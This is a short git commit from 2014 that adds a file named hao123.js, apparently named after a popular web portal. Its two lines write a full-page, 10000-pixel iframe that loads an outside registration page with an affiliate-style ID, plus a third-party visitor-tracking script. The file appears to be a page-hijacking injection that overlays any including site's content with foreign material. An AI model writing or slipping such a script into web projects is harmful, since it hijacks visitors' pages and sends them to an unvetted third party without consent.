4f203a7b341be8926c0b79105d87d968d2d64719
china8315 <2655104123@qq.com>
2014-11-21 20:09:10 +0800

    utf8

---
+++ b/hao123.js
@@ -0,0 +1,2 @@
+document.writeln("<Iframe src=\"http://www.888hy.com/html/register.html?pid=211\" width=\"100%\" height=\"10000\" scrolling=\"yes\" frameborder=\"0\" target=\"_blank\"></Iframe>");
+document.writeln("<script src=\"http://v1.cnzz.com/z_stat.php?id=1000379573&web_id=1000379573\" language=\"JavaScript\"></script>");
